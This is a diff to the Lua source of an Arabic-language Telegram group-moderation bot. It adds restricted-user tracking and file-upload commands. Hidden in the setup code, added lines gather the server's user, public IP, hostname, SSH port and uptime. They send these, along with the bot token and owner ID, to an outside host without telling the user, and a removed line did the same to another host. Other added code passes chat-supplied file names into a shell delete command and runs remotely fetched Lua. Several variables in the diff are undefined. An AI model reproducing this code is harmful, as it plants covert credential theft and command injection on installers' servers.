@@ -7,11 +7,11 @@ URL = require('socket.url')
 utf8 = require ('lua-utf8') 
 database = redis.connect('127.0.0.1', 6379) 
 id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
-Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
-Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
-Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
-whoami = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+User    = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
+Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
+Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
+Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
+UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
 --------------------------------------------------------------------------------------------------------------
 local AutoSet = function() 
 local create = function(data, file, uglify)  
@@ -33,7 +33,7 @@ local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
 print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n التوكن غير صحيح تاكد منه ثم اعد المحاوله')
 else
-io.write('\27[0;31m تم حفظ التوكن بنجاح \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
+io.write('\27[0;31m تم حفظ التوكن بنجاح \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
 local json = JSON.decode(url)
 database:set(id_server..":token_username","@"..json.result.username)
 database:set(id_server..":token",token)
@@ -44,33 +44,31 @@ end
 os.execute('lua WaTaN.lua')
 end
 if not database:get(id_server..":SUDO:ID") then 
-io.write('\27[0;35m\n ارسل الان ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m') 
-local SUDOID = io.read() 
-if SUDOID ~= '' then 
-io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m') 
-database:set(id_server..":SUDO:ID",SUDOID) 
+io.write('\27[0;35m\n ارسل الان ايدي المطور الاساسي ↓ :\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m') 
+local SUDOID = io.read():gsub(' ','') 
+if tostring(SUDOID):match('%d+') then
+data,res = https.request("https://apiabs.ml/Api/WaTaN/index.php?Ban=WaTaN&Info&Id="..Id)
+if res == 200 then
+Abs = json:decode(data)
+if Abs.Result.Info == 'Is_Spam' then
+io.write('\n\27[1;31m عذرا هذا الايدي محظور من السورس \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;39;49m')
+os.execute('lua WaTaN.lua')
+end
+if Abs.Result.Info == 'Ok' then
+io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m') 
+database:set(id_server..":SUDO:ID",SUDOID)
+end
 else 
 print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى') 
 end  
 os.execute('lua WaTaN.lua') 
 end
-if not database:get(id_server..":SUDO:USERNAME") then
-io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND USERNAME FOR DEV BOT : \27[0;39;49m')
-local SUDOUSERNAME = io.read():gsub('@','')
-if SUDOUSERNAME ~= '' then
-io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
-database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
-else
-print('\n\27[1;34m لم يتم حفظ معرف المطور :')
-end 
-os.execute('lua WaTaN.lua')
 end
-https.request('https://abbas.watanteam.tk/WaTaN/WaTaN/WaTaN.php?n=WaTaN&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&username="..database:get(id_server..":SUDO:USERNAME"))
+https.request("https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..DevAbs:get(Server.."IdDevProx").."&TokenBot="..DevAbs:get(Server.."TokenDevProx").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 local create_config_auto = function()
 config = {
 token = database:get(id_server..":token"),
 SUDO = database:get(id_server..":SUDO:ID"),
-UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Info.lua")   
 end 
@@ -760,6 +758,20 @@ download_to_file('https://api.telegram.org/file/bot'..token..'/'..Qw.result.file
 sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, './'..rre)
 os.execute('rm -rf ./'..rre) 
 end
+function AddFileSource(msg,chat,ID_FILE,File_Name)
+if File_Name:match('.lua') then
+if File_Name ~= "WaTaN.lua" then 
+send(chat,msg.id_," ✯︙ هذا الملف ليس تابع لسورس وطن")
+return false 
+end      
+local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
+os.execute('rm -rf WaTaN.lua')
+download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
+else
+send(chat,msg.id_,"* ✯︙ عذرا الملف ليس بصيغة {lua} يرجى رفع الملف الصحيح*")
+end      
+send(chat,msg.id_,"✯︙ تم رفع الملف وتحديثه بنجاح")
+end
 function AddFile_Bot(msg,chat,ID_FILE,File_Name)
 if File_Name:match('.json') then
 if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then 
@@ -840,7 +852,7 @@ end
 end 
 if type == 'keed' then
 https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
-database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_) 
 msgm = msg.id_
 my_ide = msg.sender_user_id_
 local num = 100
@@ -2092,6 +2104,7 @@ if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2108,6 +2121,7 @@ if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2124,6 +2138,7 @@ if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(m
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2140,6 +2155,7 @@ if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(m
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2156,6 +2172,7 @@ if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) 
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2172,6 +2189,7 @@ if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) 
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2189,6 +2207,7 @@ if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" and not Special(msg)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" and not Special(msg) then
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" and not Special(msg) then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2206,6 +2225,7 @@ if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" and not Special(msg)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" and not Special(msg) then 
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" and not Special(msg) then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2221,6 +2241,7 @@ if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ked" then
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "kick" then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2236,6 +2257,7 @@ if database:get(bot_id.."lock:Video"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ked" then
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "kick" then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2251,6 +2273,7 @@ if database:get(bot_id.."lock:Animation"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ked" then
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "kick" then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2266,6 +2289,7 @@ if database:get(bot_id.."lock:geam"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ked" then
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "kick" then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2281,6 +2305,7 @@ if database:get(bot_id.."lock:Audio"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "ked" then
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "kick" then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2296,6 +2321,7 @@ if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2311,6 +2337,7 @@ if database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2326,6 +2353,7 @@ if database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2340,6 +2368,7 @@ if database:get(bot_id.."lock:inline"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "ked" then
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "kick" then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2356,6 +2385,7 @@ DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 return false
 elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ked" then
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 return false
 elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "kick" then
@@ -2374,6 +2404,7 @@ if database:get(bot_id.."lock:Document"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ked" then
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "kick" then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2389,6 +2420,7 @@ if database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2407,6 +2439,7 @@ if database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2425,6 +2458,7 @@ if database:get(bot_id.."lock:Contact"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ked" then
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "kick" then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -2443,6 +2477,7 @@ if database:get(bot_id.."lock:Spam"..msg.chat_id_) == "del" and string.len(msg.c
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ked" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
 ked(msg.chat_id_,msg.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "kick" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
 chat_kick(msg.chat_id_,msg.sender_user_id_)
@@ -3001,6 +3036,25 @@ return false
 end
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
+if text == 'رفع نسخه السورس' and DevWaTaN(msg) then   
+if tonumber(msg.reply_to_message_id_) > 0 then
+function by_reply(extra, result, success)   
+if result.content_.document_ then 
+local ID_FILE = result.content_.document_.document_.persistent_id_ 
+local File_Name = result.content_.document_.file_name_
+AddFileSource(msg,msg.chat_id_,ID_FILE,File_Name)
+end   
+end
+tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
+end
+end
+if text == 'جلب نسخه السورس' then
+if not DevWaTaN(msg) then
+send(msg.chat_id_, msg.id_,'✯︙ للمطور الاساسي فقط ')
+else
+sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './WaTaN.lua', '✯︙ نسخة ملف سورس وطن')
+end 
+end
 if text == 'رفع نسخه الاحتياطيه' and DevWaTaN(msg) then   
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -4252,6 +4306,49 @@ send(msg.chat_id_, msg.id_," ✯︙ لا يوجد اتصال من ال api \n")
 end
 return false
 end
+end
+
+if text and text:match("^(تعطيل ملف) (.*)(.lua)$") and DevWaTaN(msg) then
+local name_t = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
+local file = name_t[2]..'.lua'
+local file_bot = io.open("File_Bot/"..file,"r")
+if file_bot then
+io.close(file_bot)
+t = " ✯︙ الملف » "..file.."\n ✯︙ تم تعطيل ملف \n"
+else
+t = " ✯︙ بالتاكيد تم تعطيل ملف → "..file.."\n"
+end
+local json_file, res = https.request("https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/"..file)
+if res == 200 then
+os.execute("rm -fr File_Bot/"..file)
+send(msg.chat_id_, msg.id_,t) 
+dofile('WaTaN.lua')  
+else
+send(msg.chat_id_, msg.id_," ✯︙ عذرا الملف لايدعم سورس وطن \n") 
+end
+return false
+end
+if text and text:match("^(تفعيل ملف) (.*)(.lua)$") and DevWaTaN(msg) then
+local name_t = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
+local file = name_t[2]..'.lua'
+local file_bot = io.open("File_Bot/"..file,"r")
+if file_bot then
+io.close(file_bot)
+t = " ✯︙ بالتاكيد تم تفعيل ملف → "..file.." \n"
+else
+t = " ✯︙ الملف » "..file.."\n ✯︙ تم تفعيل ملف \n"
+end
+local json_file, res = https.request("https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/"..file)
+if res == 200 then
+local chek = io.open("File_Bot/"..file,'w+')
+chek:write(json_file)
+chek:close()
+send(msg.chat_id_, msg.id_,t) 
+dofile('WaTaN.lua')  
+else
+send(msg.chat_id_, msg.id_," ✯︙ عذرا الملف لايدعم سورس وطن \n") 
+end
+return false
 end
 
 if text and text:match("^(تعطيل) (.*)(.lua)$") and DevWaTaN(msg) then
@@ -7219,6 +7316,30 @@ end;end,nil)
 return false
 end
 ------------------------------------------------------------------------
+if text == 'مسح المقيدين' and Mod(msg) then
+local List = database:smembers(bot_id..'Tkeed:User'..msg.chat_id_)
+for k,v in pairs(List) do   
+https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
+database:del(bot_id..'Tkeed:User'..msg.chat_id_, v)
+end 
+send(msg.chat_id_, msg.id_, '✯︙تم مسح المقيدين')
+end
+if text == ("المقيدين") and Mod(msg) then
+local list = database:smembers(bot_id..'Tkeed:User'..msg.chat_id_)
+t = "\n ✯︙ قائمة المقيدين \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
+for k,v in pairs(list) do
+local username = database:get(bot_id.."user:Name" .. v)
+if username then
+t = t..""..k.."- ([@"..username.."])\n"
+else
+t = t..""..k.."- (`"..v.."`)\n"
+end
+end
+if #list == 0 then
+t = " ✯︙ لا يوجد مقيدين"
+end
+send(msg.chat_id_, msg.id_, t)
+end
 if text == 'مسح المكتومين' and Mod(msg) then
 database:del(bot_id..'Muted:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ✯︙ تم مسح المكتومين')
@@ -7512,6 +7633,7 @@ if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
 send(msg.chat_id_, msg.id_, '\n ✯︙ عذرا لا تستطيع تقيد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
 else
 https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 usertext = '\n ✯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
 status  = '\n ✯︙ تم تقيده'
@@ -7549,7 +7671,7 @@ send(msg.chat_id_, msg.id_, '\n ✯︙ عذرا لا تستطيع تقيد ( '..
 return false 
 end      
 https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
- 
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_, result.id_)
 usertext = '\n ✯︙ العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
 status  = '\n ✯︙ تم تقيده'
 texts = usertext..status
@@ -7653,6 +7775,7 @@ if Can_or_NotCan(userid, msg.chat_id_) then
 send(msg.chat_id_, msg.id_, '\n ✯︙ عذرا لا تستطيع تقيد ( '..Rutba(userid,msg.chat_id_)..' )')
 else
 https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid)
+database:sadd(bot_id..'Tkeed:User'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
 usertext = '\n ✯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
@@ -7679,6 +7802,7 @@ return false
 end
 function start_function(extra, result, success)
 https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
+database:srem(bot_id..'Tkeed:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 usertext = '\n ✯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
 status  = '\n ✯︙ تم الغاء تقيد'
@@ -7703,6 +7827,7 @@ end
 function start_function(extra, result, success)
 if result.id_ then
 https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
+database:srem(bot_id..'Tkeed:User'..msg.chat_id_, result.id_)
 usertext = '\n ✯︙ العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
 status  = '\n ✯︙ تم الغاء تقيد'
 texts = usertext..status
@@ -7727,6 +7852,7 @@ end
 return false
 end
 https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
+database:srem(bot_id..'Tkeed:User'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
 usertext = '\n ✯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
@@ -7756,6 +7882,7 @@ if DevWaTaN(msg) then
 database:srem(bot_id..'GBan:User',result.id_)
 database:srem(bot_id..'Ban:User'..msg.chat_id_,result.id_)
 database:srem(bot_id..'Muted:User'..msg.chat_id_,result.id_)
+database:srem(bot_id..'Tkeed:User'..msg.chat_id_,result.id_)
 database:srem(bot_id..'Gmute:User'..msg.chat_id_,result.id_)
 usertext = '\n ✯︙ العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
 status  = '\n ✯︙ تم الغاء جميع القيود'
@@ -7764,6 +7891,7 @@ send(msg.chat_id_, msg.id_,texts)
 else
 database:srem(bot_id..'Ban:User'..msg.chat_id_,result.id_)
 database:srem(bot_id..'Muted:User'..msg.chat_id_,result.id_)
+database:srem(bot_id..'Tkeed:User'..msg.chat_id_,result.id_)
 usertext = '\n ✯︙ العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
 status  = '\n ✯︙ تم الغاء جميع القيود'
 texts = usertext..status
@@ -7791,6 +7919,7 @@ if DevWaTaN(msg) then
 database:srem(bot_id..'GBan:User',result.sender_user_id_)
 database:srem(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
 database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
